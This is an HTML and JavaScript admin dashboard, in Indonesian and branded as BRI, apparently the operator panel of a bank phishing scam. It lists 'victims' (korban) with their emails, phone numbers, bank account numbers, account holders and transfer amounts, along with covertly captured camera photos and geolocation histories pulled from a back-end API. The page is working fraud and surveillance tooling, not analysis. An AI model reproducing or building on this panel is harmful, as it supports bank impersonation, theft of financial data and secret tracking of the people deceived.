<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BRI Admin - Dashboard</title>
    <style>
        :root {
            --bri-blue: #00529C;
            --bri-blue-light: #0066b3;
            --bri-orange: #F58220;
            --bg-dark: #0a0a0f;
            --bg-card: #12121a;
            --bg-input: #1a1a25;
            --border: #2a2a3a;
            --text-white: #ffffff;
            --text-gray: #a0a0b0;
            --text-dim: #6a6a80;
            --success: #00d68f;
            --danger: #ff4757;
            --warning: #ffa502;
            --radius: 10px;
            --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: var(--bg-dark);
            min-height: 100vh;
            display: flex;
        }

        .sidebar {
            width: 260px;
            background: var(--bg-card);
            border-right: 1px solid var(--border);
            padding: 25px 20px;
            height: 100vh;
            position: fixed;
            display: flex;
            flex-direction: column;
        }

        .sidebar-logo {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 35px;
            padding: 0 10px;
        }

        .sidebar-logo-icon {
            width: 38px;
            height: 38px;
            background: linear-gradient(135deg, var(--bri-blue) 0%, var(--bri-blue-light) 100%);
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .sidebar-logo-icon svg {
            width: 20px;
            height: 20px;
            color: white;
        }

        .sidebar-logo-text {
            color: var(--text-white);
            font-size: 16px;
            font-weight: 700;
            letter-spacing: 0.5px;
        }

        .sidebar-menu {
            list-style: none;
            flex: 1;
        }

        .sidebar-item {
            padding: 13px 15px;
            color: var(--text-gray);
            border-radius: var(--radius);
            margin-bottom: 4px;
            cursor: pointer;
            transition: var(--transition);
            font-size: 13px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .sidebar-item svg {
            width: 16px;
            height: 16px;
        }

        .sidebar-item:hover {
            background: rgba(255,255,255,0.05);
            color: var(--text-white);
        }

        .sidebar-item.active {
            background: linear-gradient(135deg, var(--bri-blue) 0%, var(--bri-blue-light) 100%);
            color: var(--text-white);
            font-weight: 600;
        }

        .sidebar-logout {
            padding: 13px 15px;
            color: var(--danger);
            border-radius: var(--radius);
            cursor: pointer;
            transition: var(--transition);
            font-size: 13px;
            display: flex;
            align-items: center;
            gap: 10px;
            border-top: 1px solid var(--border);
            padding-top: 20px;
        }

        .sidebar-logout:hover {
            background: rgba(255,71,87,0.1);
        }

        .main-content {
            margin-left: 260px;
            flex: 1;
            padding: 30px;
            min-height: 100vh;
        }

        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
        }

        .header-title {
            color: var(--text-white);
            font-size: 26px;
            font-weight: 700;
        }

        .header-time {
            color: var(--text-dim);
            font-size: 12px;
            letter-spacing: 0.5px;
        }

        .stats-container {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }

        .stat-card {
            background: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: 12px;
            padding: 22px;
            transition: var(--transition);
        }

        .stat-card:hover {
            border-color: var(--bri-blue);
            box-shadow: 0 8px 24px rgba(0,82,156,0.15);
        }

        .stat-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 12px;
        }

        .stat-icon {
            width: 36px;
            height: 36px;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .stat-icon.blue {
            background: rgba(0,82,156,0.15);
        }

        .stat-icon.blue svg {
            color: var(--bri-blue-light);
        }

        .stat-icon.green {
            background: rgba(0,214,143,0.15);
        }

        .stat-icon.green svg {
            color: var(--success);
        }

        .stat-icon.orange {
            background: rgba(245,130,32,0.15);
        }

        .stat-icon.orange svg {
            color: var(--bri-orange);
        }

        .stat-icon.red {
            background: rgba(255,71,87,0.15);
        }

        .stat-icon.red svg {
            color: var(--danger);
        }

        .stat-icon svg {
            width: 18px;
            height: 18px;
        }

        .stat-value {
            color: var(--text-white);
            font-size: 28px;
            font-weight: 700;
        }

        .stat-label {
            color: var(--text-dim);
            font-size: 12px;
            margin-top: 4px;
        }

        .table-container {
            background: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: 12px;
            overflow: hidden;
        }

        .table-header {
            display: grid;
            grid-template-columns: 0.5fr 1.5fr 1fr 1fr 1fr 0.7fr;
            padding: 16px 20px;
            background: rgba(0,0,0,0.3);
            border-bottom: 1px solid var(--border);
            color: var(--text-gray);
            font-size: 11px;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 0.8px;
        }

        .table-row {
            display: grid;
            grid-template-columns: 0.5fr 1.5fr 1fr 1fr 1fr 0.7fr;
            padding: 16px 20px;
            border-bottom: 1px solid var(--border);
            color: var(--text-gray);
            font-size: 13px;
            cursor: pointer;
            transition: var(--transition);
            align-items: center;
        }

        .table-row:hover {
            background: rgba(255,255,255,0.03);
        }

        .table-row:last-child {
            border-bottom: none;
        }

        .view-btn {
            padding: 8px 14px;
            background: linear-gradient(135deg, var(--bri-blue) 0%, var(--bri-blue-light) 100%);
            color: var(--text-white);
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-size: 11px;
            font-weight: 600;
            transition: var(--transition);
        }

        .view-btn:hover {
            box-shadow: 0 4px 12px rgba(0,82,156,0.4);
            transform: translateY(-1px);
        }

        .modal-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0,0,0,0.85);
            z-index: 1000;
            justify-content: center;
            align-items: center;
            backdrop-filter: blur(8px);
        }

        .modal-overlay.active {
            display: flex;
        }

        .modal-content {
            background: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: 14px;
            padding: 30px;
            width: 90%;
            max-width: 900px;
            max-height: 90vh;
            overflow-y: auto;
        }

        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 24px;
            padding-bottom: 16px;
            border-bottom: 1px solid var(--border);
        }

        .modal-title {
            color: var(--text-white);
            font-size: 20px;
            font-weight: 700;
        }

        .close-btn {
            padding: 10px 18px;
            background: var(--danger);
            color: var(--text-white);
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-size: 13px;
            font-weight: 600;
            transition: var(--transition);
        }

        .close-btn:hover {
            background: #ff2d3f;
        }

        .info-section {
            margin-bottom: 24px;
        }

        .info-section-title {
            color: var(--text-white);
            font-size: 14px;
            font-weight: 700;
            margin-bottom: 12px;
            letter-spacing: 0.5px;
        }

        .info-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 12px;
        }

        .info-item {
            background: var(--bg-input);
            border: 1px solid var(--border);
            border-radius: 8px;
            padding: 14px;
        }

        .info-label {
            color: var(--text-dim);
            font-size: 11px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-bottom: 6px;
        }

        .info-value {
            color: var(--text-white);
            font-size: 14px;
            font-weight: 500;
        }

        .photos-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
            gap: 15px;
        }

        .photo-item {
            position: relative;
            border-radius: 8px;
            overflow: hidden;
            border: 1px solid var(--border);
        }

        .photo-item img {
            width: 100%;
            display: block;
        }

        .photo-time {
            color: var(--text-dim);
            font-size: 10px;
            text-align: center;
            padding: 8px;
            background: var(--bg-input);
        }

        .map-link {
            display: inline-block;
            padding: 10px 18px;
            background: linear-gradient(135deg, var(--success) 0%, #00b87a 100%);
            color: white;
            text-decoration: none;
            border-radius: 6px;
            font-size: 13px;
            font-weight: 600;
            transition: var(--transition);
        }

        .map-link:hover {
            box-shadow: 0 4px 16px rgba(0,214,143,0.4);
        }

        .location-list {
            background: var(--bg-input);
            border: 1px solid var(--border);
            border-radius: 8px;
            padding: 15px;
            max-height: 250px;
            overflow-y: auto;
        }

        .location-item {
            padding: 10px 0;
            border-bottom: 1px solid var(--border);
            color: var(--text-gray);
            font-size: 12px;
        }

        .location-item:last-child {
            border-bottom: none;
        }

        .empty-state {
            text-align: center;
            padding: 40px;
            color: var(--text-dim);
            font-size: 13px;
        }
    </style>
</head>
<body>
    <div class="sidebar">
        <div class="sidebar-logo">
            <div class="sidebar-logo-icon">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                    <path d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/>
                </svg>
            </div>
            <span class="sidebar-logo-text">BRI Admin</span>
        </div>
        <ul class="sidebar-menu">
            <li class="sidebar-item active">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
                    <rect x="3" y="3" width="7" height="7" rx="1"/>
                    <rect x="14" y="3" width="7" height="7" rx="1"/>
                    <rect x="14" y="14" width="7" height="7" rx="1"/>
                    <rect x="3" y="14" width="7" height="7" rx="1"/>
                </svg>
                Dashboard
            </li>
            <li class="sidebar-item">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
                    <path d="M17 21v-2a4 4 0 00-4-4H5a4 4 0 00-4 4v2M23 21v-2a4 4 0 00-3-3.87M16 3.13a4 4 0 010 7.75M9 11a4 4 0 100-8 4 4 0 000 8z"/>
                </svg>
                Korban
            </li>
            <li class="sidebar-item">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
                    <path d="M23 19a2 2 0 01-2 2H3a2 2 0 01-2-2V8a2 2 0 012-2h4l2-3h6l2 3h4a2 2 0 012 2v11z"/>
                    <circle cx="12" cy="13" r="4"/>
                </svg>
                Foto
            </li>
            <li class="sidebar-item">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
                    <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0118 0z"/>
                    <circle cx="12" cy="10" r="3"/>
                </svg>
                Lokasi
            </li>
        </ul>
        <div class="sidebar-logout" onclick="logout()">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
                <path d="M9 21H5a2 2 0 01-2-2V5a2 2 0 012-2h4M16 17l5-5-5-5M21 12H9"/>
            </svg>
            Keluar
        </div>
    </div>

    <div class="main-content">
        <div class="header">
            <h1 class="header-title">Dashboard</h1>
            <span class="header-time" id="headerTime"></span>
        </div>

        <div class="stats-container">
            <div class="stat-card">
                <div class="stat-header">
                    <div class="stat-icon blue">
                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
                            <path d="M17 21v-2a4 4 0 00-4-4H5a4 4 0 00-4 4v2M9 11a4 4 0 100-8 4 4 0 000 8z"/>
                        </svg>
                    </div>
                </div>
                <div class="stat-value" id="totalVictims">0</div>
                <div class="stat-label">Total Korban</div>
            </div>
            <div class="stat-card">
                <div class="stat-header">
                    <div class="stat-icon green">
                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
                            <path d="M23 19a2 2 0 01-2 2H3a2 2 0 01-2-2V8a2 2 0 012-2h4l2-3h6l2 3h4a2 2 0 012 2v11z"/>
                            <circle cx="12" cy="13" r="4"/>
                        </svg>
                    </div>
                </div>
                <div class="stat-value" id="totalPhotos">0</div>
                <div class="stat-label">Total Foto</div>
            </div>
            <div class="stat-card">
                <div class="stat-header">
                    <div class="stat-icon orange">
                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
                            <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0118 0z"/>
                            <circle cx="12" cy="10" r="3"/>
                        </svg>
                    </div>
                </div>
                <div class="stat-value" id="totalLocations">0</div>
                <div class="stat-label">Total Lokasi</div>
            </div>
            <div class="stat-card">
                <div class="stat-header">
                    <div class="stat-icon red">
                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
                            <circle cx="12" cy="12" r="10"/>
                            <polyline points="12 6 12 12 16 14"/>
                        </svg>
                    </div>
                </div>
                <div class="stat-value" id="todayVictims">0</div>
                <div class="stat-label">Korban Hari Ini</div>
            </div>
        </div>

        <div class="table-container">
            <div class="table-header">
                <span>ID</span>
                <span>Email</span>
                <span>Phone</span>
                <span>Bank</span>
                <span>Amount</span>
                <span>Aksi</span>
            </div>
            <div id="victimsList"></div>
        </div>
    </div>

    <div class="modal-overlay" id="detailModal">
        <div class="modal-content">
            <div class="modal-header">
                <h2 class="modal-title">Detail Korban</h2>
                <button class="close-btn" onclick="closeModal()">Tutup</button>
            </div>
            <div id="victimDetails"></div>
        </div>
    </div>

    <script>
        let allVictims = [];

        function updateTime() {
            const now = new Date();
            document.getElementById('headerTime').textContent = now.toLocaleString('id-ID');
        }
        updateTime();
        setInterval(updateTime, 1000);

        async function loadVictims() {
            try {
                const response = await fetch('/api/admin/victims');
                const data = await response.json();
                
                if (data.success) {
                    allVictims = data.victims;
                    displayVictims(allVictims);
                    updateStats();
                }
            } catch (error) {
                console.error('Failed to load victims');
            }
        }

        function displayVictims(victims) {
            const listContainer = document.getElementById('victimsList');
            
            if (victims.length === 0) {
                listContainer.innerHTML = '<div class="empty-state">Belum ada data korban</div>';
                return;
            }

            listContainer.innerHTML = '';
            victims.forEach(victim => {
                const row = document.createElement('div');
                row.className = 'table-row';
                row.innerHTML = `
                    <span>#${victim.id}</span>
                    <span>${victim.email || '-'}</span>
                    <span>${victim.phone || '-'}</span>
                    <span>${victim.bank_name || '-'}</span>
                    <span>${victim.transfer_amount ? 'Rp ' + victim.transfer_amount : '-'}</span>
                    <span><button class="view-btn" onclick="viewDetails('${victim.session_id}')">Lihat</button></span>
                `;
                listContainer.appendChild(row);
            });
        }

        async function updateStats() {
            document.getElementById('totalVictims').textContent = allVictims.length;

            let totalPhotos = 0;
            let totalLocations = 0;
            let todayCount = 0;
            const today = new Date().toDateString();

            for (const victim of allVictims) {
                const victimDate = new Date(victim.created_at).toDateString();
                if (victimDate === today) todayCount++;

                try {
                    const response = await fetch(`/api/admin/victim/${victim.session_id}`);
           const data = await response.json();
                    if (data.success) {
                        totalPhotos += data.photos.length;
                        totalLocations += data.locations.length;
                    }
                } catch (error) {}
            }

            document.getElementById('totalPhotos').textContent = totalPhotos;
            document.getElementById('totalLocations').textContent = totalLocations;
            document.getElementById('todayVictims').textContent = todayCount;
        }

        async function viewDetails(sessionId) {
            try {
                const response = await fetch(`/api/admin/victim/${sessionId}`);
                const data = await response.json();

                if (data.success) {
                    const detailsContainer = document.getElementById('victimDetails');
                    
                    let html = '<div class="info-section"><div class="info-section-title">Informasi Korban</div><div class="info-grid">';
                    
                    const victim = allVictims.find(v => v.session_id === sessionId);
                    if (victim) {
                        html += `
                            <div class="info-item"><div class="info-label">Email</div><div class="info-value">${victim.email || '-'}</div></div>
                            <div class="info-item"><div class="info-label">Phone</div><div class="info-value">${victim.phone || '-'}</div></div>
                            <div class="info-item"><div class="info-label">Bank</div><div class="info-value">${victim.bank_name || '-'}</div></div>
                            <div class="info-item"><div class="info-label">Rekening</div><div class="info-value">${victim.account_number || '-'}</div></div>
                            <div class="info-item"><div class="info-label">Nama</div><div class="info-value">${victim.account_holder || '-'}</div></div>
                            <div class="info-item"><div class="info-label">Jumlah</div><div class="info-value">${victim.transfer_amount ? 'Rp ' + victim.transfer_amount : '-'}</div></div>
                            <div class="info-item"><div class="info-label">IP Address</div><div class="info-value">${victim.ip_address || '-'}</div></div>
                            <div class="info-item"><div class="info-label">Waktu</div><div class="info-value">${new Date(victim.created_at).toLocaleString('id-ID')}</div></div>
                        `;
                    }
                    html += '</div></div>';

                    if (data.locations.length > 0) {
                        const latest = data.locations[0];
                        html += '<div class="info-section"><div class="info-section-title">Lokasi Terakhir</div>';
                        html += '<div class="info-grid">';
                        html += `<div class="info-item"><div class="info-label">Latitude</div><div class="info-value">${latest.latitude}</div></div>`;
                        html += `<div class="info-item"><div class="info-label">Longitude</div><div class="info-value">${latest.longitude}</div></div>`;
                        html += `<div class="info-item"><div class="info-label">Akurasi</div><div class="info-value">${latest.accuracy}m</div></div>`;
                        html += `<div class="info-item"><div class="info-label">Waktu</div><div class="info-value">${new Date(latest.captured_at).toLocaleString('id-ID')}</div></div>`;
                        html += '</div>';
                        html += `<a href="https://www.google.com/maps?q=${latest.latitude},${latest.longitude}" target="_blank" class="map-link">Buka di Google Maps</a>`;
                        html += '</div>';
                    }

                    if (data.photos.length > 0) {
                        html += '<div class="info-section"><div class="info-section-title">Foto Kamera</div><div class="photos-grid">';
                        data.photos.forEach(photo => {
                            html += `
                                <div class="photo-item">
                                    <img src="${photo.photo_data}" alt="Foto">
                                    <div class="photo-time">${new Date(photo.captured_at).toLocaleString('id-ID')}</div>
                                </div>
                            `;
                        });
                        html += '</div></div>';
                    }

                    if (data.locations.length > 1) {
                        html += '<div class="info-section"><div class="info-section-title">Riwayat Lokasi</div><div class="location-list">';
                        data.locations.slice(0, 30).forEach(loc => {
                            html += `<div class="location-item">${new Date(loc.captured_at).toLocaleString('id-ID')} - ${loc.latitude}, ${loc.longitude} (${loc.accuracy}m)</div>`;
                        });
                        html += '</div></div>';
                    }

                    detailsContainer.innerHTML = html;
                    document.getElementById('detailModal').classList.add('active');
                }
            } catch (error) {
                console.error('Failed to view details');
            }
        }

        function closeModal() {
            document.getElementById('detailModal').classList.remove('active');
        }

        function logout() {
            window.location.href = '/api/admin/logout';
        }

        loadVictims();
        setInterval(loadVictims, 30000);
    </script>
</body>
</html>
